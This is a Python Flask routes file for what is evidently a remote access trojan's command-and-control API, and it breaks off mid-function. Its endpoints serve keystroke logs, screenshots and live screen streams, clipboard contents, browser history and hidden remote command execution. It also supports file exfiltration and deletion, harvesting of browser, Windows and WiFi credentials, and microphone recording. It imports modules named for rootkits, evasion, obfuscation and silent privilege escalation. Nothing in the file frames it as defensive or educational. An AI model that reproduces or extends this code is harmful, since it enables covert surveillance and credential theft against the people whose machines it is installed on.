"""
API Routes - Flask application and all endpoints
Fixed version with proper Flask initialization
"""
import os
import base64
import time
import signal
from datetime import datetime
from threading import Thread
from flask import Flask, request, jsonify
from flask_cors import CORS

from .monitoring import (
    start_monitoring, stop_monitoring, get_monitoring_status,
    get_events, get_keystrokes, log_event
)
from .screenshots import (
    take_screenshot, get_screenshot_history, get_latest_screenshot,
    set_auto_screenshot
)
from .clipboard import (
    get_clipboard_text, set_clipboard_text, 
    get_clipboard_history, start_clipboard_monitoring,
    stop_clipboard_monitoring, CLIPBOARD_AVAILABLE
)
from .process_manager import (
    get_processes_list, kill_process_by_pid, kill_process_by_name,
    kill_process_tree, search_processes, get_process_instances
)
from .remote_commands import execute_remote_command
from .config import SCREENSHOTS_DIR, CONFIG_FILE, config, pc_id
from .file_transfer import (
    start_upload, upload_chunk, start_download, download_chunk,
    get_transfer_status, cancel_transfer, list_transfers, list_uploaded_files
)
from .browser_history import browser_parser
from .network_monitor import network_monitor
from .system_info import system_collector
from .live_viewer import live_viewer
from .encryption import encryption_manager
from .credential_harvester import credential_harvester
try:
    from .surveillance_suite import surveillance_suite
    SURVEILLANCE_AVAILABLE = True
except ImportError:
    surveillance_suite = None
    SURVEILLANCE_AVAILABLE = False
    print("[!] Surveillance suite not available - install opencv-python to enable")
from .persistence_manager import persistence_manager
from .advanced_c2 import advanced_c2
from .rootkit_core import rootkit_core
from .advanced_evasion import advanced_evasion
from .payload_obfuscation import payload_obfuscator
from .advanced_privilege_escalation import privilege_escalator
from .silent_elevation import silent_elevation

# Initialize Flask app
app = Flask(__name__)
CORS(app)

API_KEY = config['api_key']

def require_auth(f):
    """Authentication decorator"""
    def decorated(*args, **kwargs):
        request_key = request.headers.get('X-API-Key')
        if request_key != API_KEY:
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    decorated.__name__ = f.__name__
    return decorated

@app.route('/api/status', methods=['GET'])
def status():
    """Get current monitoring status (no auth required)"""
    return jsonify({
        "monitoring": get_monitoring_status(),
        "event_count": len(get_events()),
        "keystroke_count": len(get_keystrokes()),
        "screenshot_count": len(get_screenshot_history()),
        "pc_id": pc_id,
        "pc_name": config.get('pc_name', 'Unknown'),
        "auto_screenshot": config.get('auto_screenshot', False),
        "offline_mode": False
    })

@app.route('/api/start', methods=['POST'])
@require_auth
def start():
    """Start monitoring"""
    result = start_monitoring(pc_id)
    return jsonify(result)

@app.route('/api/stop', methods=['POST'])
@require_auth
def stop():
    """Stop monitoring"""
    result = stop_monitoring(pc_id)
    return jsonify(result)

@app.route('/api/kill', methods=['POST'])
@require_auth
def kill_server():
    """Kill the server process"""
    log_event("server_killed", {"source": "remote_client"}, pc_id)
    stop_monitoring(pc_id)
    
    response = jsonify({"status": "server_killed", "message": "Server shutting down..."})
    
    def shutdown():
        time.sleep(1)
        print("\n[!] Server killed by remote client")
        os.kill(os.getpid(), signal.SIGTERM)
    
    Thread(target=shutdown, daemon=True).start()
    return response

@app.route('/api/events', methods=['GET'])
@require_auth
def get_events_api():
    """Get logged events with filtering"""
    limit = int(request.args.get('limit', 100))
    event_type = request.args.get('type', None)
    search = request.args.get('search', None)
    
    filtered = get_events()
    
    if event_type:
        filtered = [e for e in filtered if e['type'] == event_type]
    
    if search:
        search_lower = search.lower()
        filtered = [e for e in filtered if 
                   search_lower in str(e.get('details', {})).lower() or
                   search_lower in e['type'].lower()]
    
    return jsonify(filtered[-limit:])

@app.route('/api/keystrokes/live', methods=['GET'])
@require_auth
def get_live_keystrokes():
    """Get recent keystrokes (live feed)"""
    buffer = get_keystrokes()[-50:]
    return jsonify(buffer)

@app.route('/api/keystrokes/buffer', methods=['GET'])
@require_auth
def get_keystroke_buffer():
    """Get buffered keystrokes"""
    limit = int(request.args.get('limit', 1000))
    format_as_text = request.args.get('format', 'json') == 'text'
    
    buffer = get_keystrokes()[-limit:]
    
    if format_as_text:
        text = ""
        for ks in buffer:
            key = ks['key']
            if key.startswith('Key.'):
                key_name = key.replace('Key.', '')
                if key_name == 'space':
                    text += ' '
                elif key_name == 'enter':
                    text += '\n'
                elif key_name == 'tab':
                    text += '\t'
            else:
                text += key
        return jsonify({"text": text, "count": len(buffer)})
    else:
        return jsonify(buffer)

@app.route('/api/snapshot', methods=['POST'])
@require_auth
def snapshot():
    """Take an immediate screenshot with encryption"""
    try:
        data = request.json or {}
        encrypt = data.get('encrypt', True)
        quality = data.get('quality', 85)
        
        filepath = take_screenshot(encrypt=encrypt, quality=quality)
        if filepath:
            log_event("screenshot", {
                "filename": filepath.name,
                "encrypted": encrypt,
                "quality": quality
            }, pc_id)
            return jsonify({
                "status": "success", 
                "filename": filepath.name,
                "encrypted": encrypt,
                "quality": quality
            })
        return jsonify({"error": "Failed to capture screenshot"}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/screenshot/latest', methods=['GET'])
@require_auth
def get_latest_screenshot_api():
    """Get the most recent screenshot"""
    latest = get_latest_screenshot()
    if not latest:
        return jsonify({"error": "No screenshots available"}), 404
    
    try:
        with open(latest['path'], 'rb') as f:
            image_data = base64.b64encode(f.read()).decode('utf-8')
        
        return jsonify({
            "image": image_data,
            "timestamp": latest['timestamp'],
            "filename": latest['filename']
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/screenshot/history', methods=['GET'])
@require_auth
def get_screenshot_history_api():
    """Get screenshot history list"""
    return jsonify(get_screenshot_history())

@app.route('/api/screenshot/<filename>', methods=['GET'])
@require_auth
def get_screenshot(filename):
    """Get specific screenshot by filename"""
    filepath = SCREENSHOTS_DIR / filename
    
    if not filepath.exists():
        return jsonify({"error": "Screenshot not found"}), 404
    
    try:
        with open(filepath, 'rb') as f:
            image_data = base64.b64encode(f.read()).decode('utf-8')
        
        return jsonify({"image": image_data, "filename": filename})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/settings/screenshot', methods=['POST'])
@require_auth
def update_screenshot_settings():
    """Update automatic screenshot settings"""
    data = request.json or {}
    
    if 'enabled' in data:
        config['auto_screenshot'] = data['enabled']
    
    if 'interval' in data:
        config['screenshot_interval'] = int(data['interval'])
    
    set_auto_screenshot(
        config['auto_screenshot'],
        config.get('screenshot_interval', 300)
    )
    
    import json
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)
    
    return jsonify({
        "enabled": config['auto_screenshot'],
        "interval": config.get('screenshot_interval', 300)
    })

@app.route('/api/command', methods=['POST'])
@require_auth
def execute_command():
    """Execute remote command"""
    data = request.json or {}
    result = execute_remote_command(data, pc_id, log_event)
    
    if isinstance(result, tuple):
        return jsonify(result[0]), result[1]
    return jsonify(result)

@app.route('/api/clipboard', methods=['GET'])
@require_auth
def get_clipboard():
    """Get clipboard content"""
    if not CLIPBOARD_AVAILABLE:
        return jsonify({"error": "Clipboard functionality not available"}), 503
    
    try:
        content = get_clipboard_text()
        
        log_event("clipboard", {"operation": "get", "length": len(content) if content else 0}, pc_id)
        
        return jsonify({
            "success": True,
            "content": content if content else "",
            "timestamp": datetime.now().isoformat(),
            "available": content is not None
        })
    except Exception as e:
        return jsonify({"error": str(e), "success": False}), 500

@app.route('/api/clipboard', methods=['POST'])
@require_auth
def set_clipboard():
    """Set clipboard content"""
    if not CLIPBOARD_AVAILABLE:
        return jsonify({"error": "Clipboard functionality not available"}), 503
    
    try:
        data = request.json or {}
        content = data.get('content', '')
        
        if not isinstance(content, str):
            return jsonify({"error": "Content must be a string"}), 400
        
        success = set_clipboard_text(content)
        
        if success:
            log_event("clipboard", {"operation": "set", "length": len(content)}, pc_id)
            return jsonify({
                "success": True,
                "message": "Clipboard updated successfully"
            })
        else:
            return jsonify({"error": "Failed to set clipboard", "success": False}), 500
            
    except Exception as e:
        return jsonify({"error": str(e), "success": False}), 500
    
@app.route('/api/clipboard/history', methods=['GET'])
@require_auth
def get_clipboard_history_api():
    """Get clipboard change history"""
    if not CLIPBOARD_AVAILABLE:
        return jsonify({"error": "Clipboard functionality not available"}), 503
    
    try:
        history = get_clipboard_history()
        return jsonify({
            "success": True,
            "history": history,
            "count": len(history)
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/clipboard/monitoring', methods=['POST'])
@require_auth
def toggle_clipboard_monitoring():
    """Enable or disable clipboard monitoring"""
    if not CLIPBOARD_AVAILABLE:
        return jsonify({"error": "Clipboard functionality not available"}), 503
    
    try:
        data = request.json or {}
        enabled = data.get('enabled', True)
        
        if enabled:
            start_clipboard_monitoring()
            log_event("clipboard_monitoring", {"operation": "started"}, pc_id)
            return jsonify({"success": True, "monitoring": True})
        else:
            stop_clipboard_monitoring()
            log_event("clipboard_monitoring", {"operation": "stopped"}, pc_id)
            return jsonify({"success": True, "monitoring": False})
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/clipboard/enable', methods=['POST'])
@require_auth
def enable_clipboard_monitoring():
    """Enable clipboard monitoring (convenience endpoint)"""
    if not CLIPBOARD_AVAILABLE:
        return jsonify({"error": "Clipboard functionality not available"}), 503
    
    try:
        start_clipboard_monitoring()
        pc_id = request.headers.get('X-PC-ID', 'unknown')
        log_event("clipboard_monitoring", {"operation": "enabled"}, pc_id)
        return jsonify({
            "success": True, 
            "monitoring": True,
            "message": "Clipboard monitoring enabled"
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/process', methods=['GET'])
@require_auth
def get_processes():
    """Get list of running processes with optional search"""
    try:
        search_query = request.args.get('search', None)
        
        if search_query:
            processes = search_processes(search_query)
        else:
            processes = get_processes_list()
        
        log_event("process", {"operation": "list", "count": len(processes)}, pc_id)
        return jsonify({"success": True, "processes": processes, "count": len(processes)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/process/instances/<process_name>', methods=['GET'])
@require_auth
def get_process_instances_api(process_name):
    """Get all instances of a specific process"""
    try:
        instances = get_process_instances(process_name)
        return jsonify({
            "success": True,
            "process_name": process_name,
            "instances": instances,
            "count": len(instances)
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/process/kill', methods=['POST'])
@require_auth
def kill_process():
    """Kill process by PID or name"""
    try:
        data = request.json or {}
        
        # Determine what to kill
        pid = data.get('pid')
        name = data.get('name')
        force = data.get('force', False)
        kill_all = data.get('kill_all', True)
        kill_tree = data.get('kill_tree', False)
        
        if not pid and not name:
            return jsonify({"error": "Must specify either 'pid' or 'name'"}), 400
        
        # Kill by PID
        if pid:
            if kill_tree:
                result = kill_process_tree(int(pid))
            else:
                result = kill_process_by_pid(int(pid), force=force)
            
            log_event("process", {
                "operation": "kill_tree" if kill_tree else "kill",
                "pid": pid,
                "force": force
            }, pc_id)
            
        # Kill by name
        elif name:
            result = kill_process_by_name(name, force=force, kill_all=kill_all)
            
            log_event("process", {
                "operation": "kill_by_name",
                "name": name,
                "kill_all": kill_all,
                "force": force,
                "killed_count": result.get('killed_count', 0)
            }, pc_id)
        
        if result.get('success'):
            return jsonify(result), 200
        else:
            return jsonify(result), 500
            
    except ValueError:
        return jsonify({"error": "Invalid PID format"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/process/start', methods=['POST'])
@require_auth
def start_process():
    """Start a new process"""
    try:
        import subprocess
        
        data = request.json or {}
        command = data.get('command')
        
        if not command:
            return jsonify({"error": "Command required"}), 400
        
        process = subprocess.Popen(
            command,
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
        )
        
        log_event("process", {
            "operation": "start",
            "command": command,
            "pid": process.pid
        }, pc_id)
        
        return jsonify({
            "success": True,
            "pid": process.pid,
            "command": command
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/filesystem', methods=['GET'])
@require_auth
def list_filesystem():
    """List directory contents"""
    try:
        import os
        from pathlib import Path
        
        path = request.args.get('path', 'C:\\')
        path_obj = Path(path)
        
        if not path_obj.exists():
            return jsonify({"error": "Path does not exist"}), 404
        
        items = []
        for item in path_obj.iterdir():
            try:
                stat = item.stat()
                items.append({
                    'name': item.name,
                    'path': str(item),
                    'type': 'directory' if item.is_dir() else 'file',
                    'size': stat.st_size if item.is_file() else 0,
                    'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                    'permissions': stat.st_mode
                })
            except:
                continue
        
        log_event("filesystem", {"operation": "list", "path": path}, pc_id)
        return jsonify({
            "success": True,
            "path": str(path_obj),
            "parent": str(path_obj.parent) if path_obj.parent != path_obj else None,
            "items": items
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/filesystem', methods=['POST'])
@require_auth
def manage_filesystem():
    """Filesystem operations (mkdir, delete)"""
    try:
        data = request.json or {}
        operation = data.get('operation')
        path = data.get('path')
        
        if operation == 'mkdir':
            os.makedirs(path, exist_ok=True)
            log_event("filesystem", {"operation": "mkdir", "path": path}, pc_id)
            return jsonify({"success": True})
        
        elif operation == 'delete':
            import shutil
            if os.path.isdir(path):
                shutil.rmtree(path)
            else:
                os.remove(path)
            log_event("filesystem", {"operation": "delete", "path": path}, pc_id)
            return jsonify({"success": True})
        
        else:
            return jsonify({"error": "Invalid operation"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/export', methods=['GET'])
@require_auth
def export_data():
    """Export all data"""
    export_type = request.args.get('type', 'events')
    
    if export_type == 'events':
        data = get_events()
    elif export_type == 'keystrokes':
        data = get_keystrokes()
    else:
        return jsonify({"error": "Invalid export type"}), 400
    
    return jsonify(data)

# File Transfer Endpoints

@app.route('/api/upload/start', methods=['POST'])
@require_auth
def start_file_upload():
    """Start a file upload session"""
    try:
        data = request.json or {}
        filename = data.get('filename')
        file_size = data.get('file_size')
        file_hash = data.get('file_hash')
        
        if not filename or not file_size:
            return jsonify({"error": "filename and file_size required"}), 400
        
        result = start_upload(filename, file_size, file_hash)
        
        if result["success"]:
            log_event("file_transfer", {
                "operation": "upload_start",
                "filename": filename,
                "file_size": file_size,
                "transfer_id": result["transfer_id"]
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/upload/chunk', methods=['POST'])
@require_auth
def upload_file_chunk():
    """Upload a file chunk"""
    try:
        data = request.json or {}
        transfer_id = data.get('transfer_id')
        chunk_index = data.get('chunk_index')
        chunk_data = data.get('chunk_data')
        is_final = data.get('is_final', False)
        
        if not all([transfer_id, chunk_index is not None, chunk_data]):
            return jsonify({"error": "transfer_id, chunk_index, and chunk_data required"}), 400
        
        result = upload_chunk(transfer_id, chunk_index, chunk_data, is_final)
        
        if result["success"] and result.get("status") == "completed":
            log_event("file_transfer", {
                "operation": "upload_complete",
                "transfer_id": transfer_id,
                "bytes_transferred": result["bytes_transferred"]
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/download/start', methods=['POST'])
@require_auth
def start_file_download():
    """Start a file download session"""
    try:
        data = request.json or {}
        filepath = data.get('filepath')
        
        if not filepath:
            return jsonify({"error": "filepath required"}), 400
        
        result = start_download(filepath)
        
        if result["success"]:
            log_event("file_transfer", {
                "operation": "download_start",
                "filepath": filepath,
                "file_size": result["file_size"],
                "transfer_id": result["transfer_id"]
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/download/chunk', methods=['GET'])
@require_auth
def download_file_chunk():
    """Download a file chunk"""
    try:
        transfer_id = request.args.get('transfer_id')
        chunk_index = request.args.get('chunk_index')
        
        if not transfer_id or chunk_index is None:
            return jsonify({"error": "transfer_id and chunk_index required"}), 400
        
        result = download_chunk(transfer_id, int(chunk_index))
        
        if result["success"] and result.get("is_final"):
            log_event("file_transfer", {
                "operation": "download_complete",
                "transfer_id": transfer_id,
                "bytes_transferred": result["bytes_transferred"]
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/transfer/status/<transfer_id>', methods=['GET'])
@require_auth
def get_transfer_status_api(transfer_id):
    """Get transfer status"""
    try:
        result = get_transfer_status(transfer_id)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/transfer/cancel/<transfer_id>', methods=['POST'])
@require_auth
def cancel_transfer_api(transfer_id):
    """Cancel a transfer"""
    try:
        result = cancel_transfer(transfer_id)
        
        if result["success"]:
            log_event("file_transfer", {
                "operation": "transfer_cancelled",
                "transfer_id": transfer_id
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/transfers', methods=['GET'])
@require_auth
def list_transfers_api():
    """List all transfers"""
    try:
        active_only = request.args.get('active_only', 'false').lower() == 'true'
        result = list_transfers(active_only)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/uploads', methods=['GET'])
@require_auth
def list_uploaded_files_api():
    """List uploaded files"""
    try:
        result = list_uploaded_files()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Browser History Endpoints

@app.route('/api/browser/history', methods=['GET'])
@require_auth
def get_browser_history():
    """Get browser history from all browsers or specific browser"""
    try:
        browser = request.args.get('browser')
        limit = int(request.args.get('limit', 1000))
        
        if browser:
            result = browser_parser.get_browser_history(browser, limit)
        else:
            limit_per_browser = limit // 5 if limit > 100 else 100  # Distribute limit across browsers
            result = browser_parser.get_all_history(limit_per_browser)
        
        if result["success"]:
            log_event("browser_history", {
                "operation": "get_history",
                "browser": browser or "all",
                "entries_found": result.get("total_entries", 0)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/browser/history/search', methods=['GET'])
@require_auth
def search_browser_history():
    """Search browser history"""
    try:
        query = request.args.get('query')
        limit = int(request.args.get('limit', 100))
        
        if not query:
            return jsonify({"error": "query parameter required"}), 400
        
        result = browser_parser.search_history(query, limit)
        
        if result["success"]:
            log_event("browser_history", {
                "operation": "search_history",
                "query": query,
                "matches_found": result.get("total_matches", 0)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/browser/top-sites', methods=['GET'])
@require_auth
def get_top_sites():
    """Get most visited sites"""
    try:
        limit = int(request.args.get('limit', 50))
        result = browser_parser.get_top_sites(limit)
        
        if result["success"]:
            log_event("browser_history", {
                "operation": "get_top_sites",
                "sites_found": result.get("total_domains", 0)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Network Monitor Endpoints

@app.route('/api/network/start', methods=['POST'])
@require_auth
def start_network_monitoring():
    """Start network monitoring"""
    try:
        result = network_monitor.start_monitoring()
        
        if result["success"]:
            log_event("network_monitor", {
                "operation": "start_monitoring"
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/network/stop', methods=['POST'])
@require_auth
def stop_network_monitoring():
    """Stop network monitoring"""
    try:
        result = network_monitor.stop_monitoring()
        
        if result["success"]:
            log_event("network_monitor", {
                "operation": "stop_monitoring"
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/network/bandwidth', methods=['GET'])
@require_auth
def get_current_bandwidth():
    """Get current bandwidth usage"""
    try:
        result = network_monitor.get_current_bandwidth()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/network/bandwidth/history', methods=['GET'])
@require_auth
def get_bandwidth_history():
    """Get bandwidth history"""
    try:
        minutes = int(request.args.get('minutes', 5))
        result = network_monitor.get_bandwidth_history(minutes)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/network/interfaces', methods=['GET'])
@require_auth
def get_network_interfaces():
    """Get network interface information"""
    try:
        result = network_monitor.get_network_interfaces()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/network/connections', methods=['GET'])
@require_auth
def get_active_connections():
    """Get active network connections"""
    try:
        result = network_monitor.get_active_connections()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/network/summary', methods=['GET'])
@require_auth
def get_network_summary():
    """Get comprehensive network summary"""
    try:
        result = network_monitor.get_network_summary()
        
        if result["success"]:
            log_event("network_monitor", {
                "operation": "get_summary",
                "monitoring_active": result["monitoring_active"]
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/network/processes', methods=['GET'])
@require_auth
def get_top_network_processes():
    """Get processes with highest network usage"""
    try:
        limit = int(request.args.get('limit', 10))
        result = network_monitor.get_top_network_processes(limit)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# System Information Endpoints

@app.route('/api/system/basic', methods=['GET'])
@require_auth
def get_basic_system_info():
    """Get basic system information"""
    try:
        result = system_collector.get_basic_info()
        
        if result["success"]:
            log_event("system_info", {
                "operation": "get_basic_info",
                "system": result["basic_info"].get("system"),
                "hostname": result["basic_info"].get("hostname")
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/system/cpu', methods=['GET'])
@require_auth
def get_cpu_info():
    """Get detailed CPU information"""
    try:
        result = system_collector.get_cpu_info()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/system/memory', methods=['GET'])
@require_auth
def get_memory_info():
    """Get detailed memory information"""
    try:
        result = system_collector.get_memory_info()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/system/disk', methods=['GET'])
@require_auth
def get_disk_info():
    """Get detailed disk information"""
    try:
        result = system_collector.get_disk_info()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/system/network', methods=['GET'])
@require_auth
def get_system_network_info():
    """Get network interface information"""
    try:
        result = system_collector.get_network_info()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/system/processes', methods=['GET'])
@require_auth
def get_system_processes():
    """Get running process information"""
    try:
        result = system_collector.get_process_info()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/system/gpu', methods=['GET'])
@require_auth
def get_gpu_info():
    """Get GPU information"""
    try:
        result = system_collector.get_gpu_info()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/system/motherboard', methods=['GET'])
@require_auth
def get_motherboard_info():
    """Get motherboard information"""
    try:
        result = system_collector.get_motherboard_info()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/system/performance', methods=['GET'])
@require_auth
def get_performance_metrics():
    """Get current performance metrics"""
    try:
        result = system_collector.get_performance_metrics()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/system/complete', methods=['GET'])
@require_auth
def get_complete_system_info():
    """Get complete comprehensive system information"""
    try:
        result = system_collector.get_complete_system_info()
        
        if result["success"]:
            log_event("system_info", {
                "operation": "get_complete_info",
                "collection_time": result["system_info"]["collection_time"]
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Live Viewer Endpoints

@app.route('/api/live/start', methods=['POST'])
@require_auth
def start_live_streaming():
    """Start live screen streaming"""
    try:
        data = request.json or {}
        quality = data.get('quality', 70)
        fps = data.get('fps', 10)
        
        result = live_viewer.start_streaming(quality, fps)
        
        if result["success"]:
            log_event("live_viewer", {
                "operation": "start_streaming",
                "quality": quality,
                "fps": fps
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/live/stop', methods=['POST'])
@require_auth
def stop_live_streaming():
    """Stop live screen streaming"""
    try:
        result = live_viewer.stop_streaming()
        
        if result["success"]:
            log_event("live_viewer", {
                "operation": "stop_streaming",
                "total_frames": result.get("total_frames", 0)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/live/frame', methods=['GET'])
@require_auth
def get_live_frame():
    """Get the latest frame from live stream"""
    try:
        result = live_viewer.get_latest_frame()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/live/status', methods=['GET'])
@require_auth
def get_live_status():
    """Get live streaming status"""
    try:
        result = live_viewer.get_stream_status()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/live/settings', methods=['POST'])
@require_auth
def update_live_settings():
    """Update live streaming settings"""
    try:
        data = request.json or {}
        quality = data.get('quality')
        fps = data.get('fps')
        compression = data.get('compression')
        
        result = live_viewer.update_stream_settings(quality, fps, compression)
        
        if result["success"]:
            log_event("live_viewer", {
                "operation": "update_settings",
                "updated_settings": result["updated_settings"]
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/live/client', methods=['POST'])
@require_auth
def manage_live_client():
    """Add or remove client from live stream"""
    try:
        data = request.json or {}
        client_id = data.get('client_id')
        action = data.get('action', 'add')  # 'add' or 'remove'
        
        if not client_id:
            return jsonify({"error": "client_id required"}), 400
        
        if action == 'add':
            result = live_viewer.add_client(client_id)
        elif action == 'remove':
            result = live_viewer.remove_client(client_id)
        else:
            return jsonify({"error": "Invalid action"}), 400
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/live/frames', methods=['GET'])
@require_auth
def get_live_frame_history():
    """Get multiple recent frames"""
    try:
        count = int(request.args.get('count', 5))
        result = live_viewer.get_frame_history(count)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Encryption Endpoints

@app.route('/api/encryption/status', methods=['GET'])
@require_auth
def get_encryption_status():
    """Get encryption status for all data types"""
    try:
        result = encryption_manager.get_encryption_status()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/encryption/keys', methods=['GET'])
@require_auth
def get_encryption_keys():
    """Get encryption keys for client synchronization"""
    try:
        result = encryption_manager.export_client_keys()
        
        log_event("encryption", {
            "operation": "export_keys",
            "key_count": len(result.get("keys", {}))
        }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/encryption/settings', methods=['POST'])
@require_auth
def update_encryption_settings():
    """Update encryption settings for specific data type"""
    try:
        data = request.json or {}
        data_type = data.get('data_type')
        enabled = data.get('enabled')
        algorithm = data.get('algorithm', 'fernet')
        
        if not data_type or enabled is None:
            return jsonify({"error": "data_type and enabled required"}), 400
        
        result = encryption_manager.update_encryption_settings(data_type, enabled, algorithm)
        
        if result["success"]:
            log_event("encryption", {
                "operation": "update_settings",
                "data_type": data_type,
                "enabled": enabled
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/encryption/rotate', methods=['POST'])
@require_auth
def rotate_encryption_keys():
    """Rotate encryption keys"""
    try:
        data = request.json or {}
        data_types = data.get('data_types')  # Optional: specific data types to rotate
        
        result = encryption_manager.rotate_session_keys(data_types)
        
        if result["success"]:
            log_event("encryption", {
                "operation": "rotate_keys",
                "rotated_keys": result["rotated_keys"]
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/encryption/channel', methods=['POST'])
@require_auth
def create_secure_channel():
    """Create secure communication channel with client"""
    try:
        data = request.json or {}
        client_public_key = data.get('client_public_key')
        
        if not client_public_key:
            return jsonify({"error": "client_public_key required"}), 400
        
        result = encryption_manager.create_secure_channel(client_public_key)
        
        if result["success"]:
            log_event("encryption", {
                "operation": "create_channel",
                "channel_id": result["channel_id"]
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Credential Harvesting Endpoints

@app.route('/api/credentials/harvest', methods=['POST'])
@require_auth
def harvest_all_credentials():
    """Harvest credentials from all available sources"""
    try:
        result = credential_harvester.harvest_all_credentials()
        
        if result["success"]:
            log_event("credential_harvest", {
                "operation": "harvest_all",
                "total_credentials": result.get("total_credentials_found", 0)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/credentials/browser', methods=['POST'])
@require_auth
def harvest_browser_credentials():
    """Harvest browser credentials only"""
    try:
        result = credential_harvester.harvest_browser_credentials()
        
        if result["success"]:
            log_event("credential_harvest", {
                "operation": "harvest_browser",
                "credentials_found": result.get("count", 0)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/credentials/windows', methods=['POST'])
@require_auth
def harvest_windows_credentials():
    """Harvest Windows credential manager credentials"""
    try:
        result = credential_harvester.harvest_windows_credentials()
        
        if result["success"]:
            log_event("credential_harvest", {
                "operation": "harvest_windows",
                "credentials_found": result.get("count", 0)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/credentials/wifi', methods=['POST'])
@require_auth
def harvest_wifi_passwords():
    """Harvest WiFi passwords"""
    try:
        result = credential_harvester.harvest_wifi_passwords()
        
        if result["success"]:
            log_event("credential_harvest", {
                "operation": "harvest_wifi",
                "passwords_found": result.get("count", 0)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Surveillance & Espionage Endpoints

@app.route('/api/surveillance/audio/start', methods=['POST'])
@require_auth
def start_audio_recording():
    """Start microphone recording"""
    try:
        data = request.json or {}
        duration = data.get('duration_minutes', 60)
